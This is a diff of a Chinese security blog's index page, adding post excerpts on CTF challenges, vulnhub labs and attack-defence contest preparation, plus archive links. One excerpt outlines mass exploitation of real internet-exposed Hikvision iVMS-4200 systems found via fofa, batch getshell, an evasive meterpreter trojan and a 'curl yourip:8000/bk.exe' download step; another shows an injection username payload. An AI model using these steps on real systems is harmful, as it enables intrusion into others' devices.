@@ -352,6 +352,199 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/2019/02/23/MERCY/" >
+            
+                <span>渗透测试MERCY</span>
+        </a>
+        <div class="abstract-content">
+            vulnhub|渗透测试digitalworld.local: MERCY题记最近在打靶机，发现一个有点东西的靶机，这里跟大家分享一下.
+环境准备vulnhub最近出的一台靶机
+靶机MERCY.zip (Size: 1.9 GB)
+Download: https://drive.google.com/uc?id=1YzsW1lCKjo_WEr6Pk511DXQBFyMMR14y&amp;export=download
+Download (Torrent): https://download.vulnhub.com/digitalworld/MERCY.zip.torrent     ( ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/01/03/swpuctf总结/" >
+            
+                <span>SWPUCTF 2018 Web题和线下赛总结</span>
+        </a>
+        <div class="abstract-content">
+            第九届swpuctf杂项题，web题加线下赛攻防总结
+线上赛MISC流量签到题流量包拖wireshark追TCP包或者直接用文档编辑器打开ctrl加f搜索关键字
+床前明月光,低头…99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33键盘密码 99就代表9那列的第二个值
+look ….. 依次读就行了
+签到题第一个flag在文件末尾
+所以修改高度为FF在底部可以看到另一半flag
+web用优惠码 买个 X ?这个题发现www.zip下有个源码泄露，下载来发现代码如下12345678910111213141516171819202122232425262728...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/03</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2019/01/01/swpuawd/" >
+            
+                <span>swpuawd赛前准备</span>
+        </a>
+        <div class="abstract-content">
+            awdwaf流量代理还有问题， 静态资源得根据绝对路径和相对路径来分别判断提权脚本批量改密码杀不死马方法测试diff或者compare测试一遍运维流程飞鸽传书
+思路
+改密码ssh(弱口令)
+
+
+进入真终端python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+
+
+web备份
+
+
+备份
+
+tar -zcvf /tmp/web.tar.gz /var/www/html
+一定要用绝对路径
+
+恢复
+
+tar -zxvf /tmp/web.tar.gz
+
+数据库备份
+
+
+备份
+
+mysqldump --all-database...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/01</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/11/18/hctf马后炮分析/" >
+            
+                <span>hctf马后炮分析</span>
+        </a>
+        <div class="abstract-content">
+            hide and seek再随便输一个非 admin 的用户名即可进入后台，提示上传 ZIP 文件。上传的zip会被解压并读取。   
+一开始还以为要上传 php 代码执行什么的，但php代码都被注释掉了。然后想到 JavaScript ，想通过xss打管理员的cookie，结果发现只能打到自己的cookie
+Linux 的软链接文件就像 Windows 的快捷方式。通过 ln  -s [目标文件] [生成文件] 生成。    
+解题流程首先读取 /proc/self/environ 文件
+什么是proc目录
+
+首先，它不是一个真正的文件系统， 而是一个虚拟的文件系统。   
+
+其次，p...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/18</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/09/01/lampiao/" >
+            
+                <span>vulnhub|渗透测试lampiao</span>
+        </a>
+        <div class="abstract-content">
+            该文已先在先知社区发表：原文地址：https://xz.aliyun.com/t/2552
+#vulnhub|渗透测试lampiao
+##题记
+最近在打靶机，发现了一个挺有意思的靶机，这里想跟大家分享一下.
+##环境准备vulnhub最近出的一台靶机
+靶机Lampiao.zip (Size: 669 MB)
+Download: https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM
+Download (Mirror): https://download.vulnhub.com/lampiao/Lampi...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/01</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/08/31/ctf入门总结/" >
+            
+                <span>ctf入门总结</span>
+        </a>
+        <div class="abstract-content">
+            下面中实验室指的是网络安全实验室
+题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些，
+文中所有知识点内容并不全，要学习原理及深入得自己去找资源学习，自学与搜集信息的能力是必不可少的
+入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》
+什么是CTF？CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA
+1.养成看源代码的习惯(简单)flag在源代码中()...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/31</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/2018/08/31/rwctf/" >
             
                 <span>rwctf和南电新生平台一题</span>
@@ -380,13 +573,48 @@ e.data.iframe.value.indexOf(&quot;//&qu...
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/23/巅峰极客/" >
+        <a class="abstract-title" href = "/2018/08/23/渗透海康卫视/" >
+            
+                <span>渗透实战</span>
+        </a>
+        <div class="abstract-content">
+            渗透实战fofa搜索引擎搜索 “iVMS-4200”
+
+信息收集漏洞利用教程
+批量利用构造批量攻击exp。将url导入url.txt中。python运行攻击exp
+ptyhon haikang.py -f url.txt
+getshell批量getshell
+用菜刀连接webshell
+用Python建立一个http服务用来传输文件
+python -m SimpleHTTPServer 8080
+
+生成免杀木马免杀教程
+##上传木马
+webshell打开命令行窗口运行如下命令，下载生成好的meterpreter木马到目标机上
+curl yourip:8000/bk.exe -f bk.e...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/23</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2018/07/28/巅峰极客/" >
             
                 <span>巅峰极客2018第一场部分wp</span>
         </a>
         <div class="abstract-content">
-            #web：
-拿到题目先百度一下，于是找到onethink的一个漏洞。
+            web：拿到题目先百度一下，于是找到onethink的一个漏洞。
 WooYun-2016-185742
 就是注册个账号为：
 %250a%24a%3d%24_GET%5ba%5d%3b%2f%2f%250aecho+%60%24a%60%3b%2f%2f
@@ -394,12 +622,12 @@ WooYun-2016-185742
  账号一的用户名：%0a$a=$_GET[a];//
  账号二的用户名：%0aecho $a;//
  注意要用burp来改包，不然会失败。之后依次登入，也要用burp来改包登入。在那之后然后访问生成的缓存文件
-本题的关键是通过源码www.zip泄露在本地浮现的时候找到...
+本题的关键是通过源码www.zip泄露在本地浮现的时候找到生成...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/23</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/28</span>
             </div>
             <!-- tags  -->
             
@@ -801,9 +1029,106 @@ WooYun-2016-185742
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 13
+        Total : 20
         </div>
         <!-- search  -->
         
@@ -819,7 +1144,22 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2020/03/14/靶机二/" >域渗透靶机二</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/ntlm请求发起/" >ntlm请求发起</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2020/02/23/抓密码/" >各种姿势的hash抓取</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href= "/2020/02/12/keberos/" >keberos协议</a>
         </li>
     
     
@@ -833,7 +1173,7 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/ntlm请求发起/" >ntlm请求发起</a>
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href= "/2019/08/14/Matrix1/" >vulnhub|渗透测试Matrix</a>
         </li>
     
     
@@ -843,22 +1183,37 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/Matrix 1/" >vulnhub|渗透测试Matrix 1</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href= "/2019/05/22/Moonraker/" >渗透测试|Moonraker</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/SICKOS/" >SICKOS 1.1 - CTF</a>
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2019/04/11/redis未授权/" >redis未授权</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/Moonraker/" >渗透测试|Moonraker</a>
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href= "/2019/04/03/nginx的秘密wp/" >nginx的秘密wp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2019/01/03/swpu/" >SWPUCTF 2018 Web题和线下赛总结</a>
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2019/03/12/SICKOS/" >SICKOS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2019/02/23/MERCY/" >渗透测试MERCY</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2019/01/03/swpuctf总结/" >SWPUCTF 2018 Web题和线下赛总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/2019/01/01/swpuawd/" >swpuawd赛前准备</a>
         </li>
     
     
@@ -882,17 +1237,22 @@ WooYun-2016-185742
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/ctf入门总结/" >ctf入门总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2018/07/23/巅峰极客/" >巅峰极客2018第一场部分wp</a>
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/rwctf/" >rwctf和南电新生平台一题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/渗透海康卫视/" >渗透实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span><a class="archive-post-title" href= "/2018/07/28/巅峰极客/" >巅峰极客2018第一场部分wp</a>
         </li>
     
     
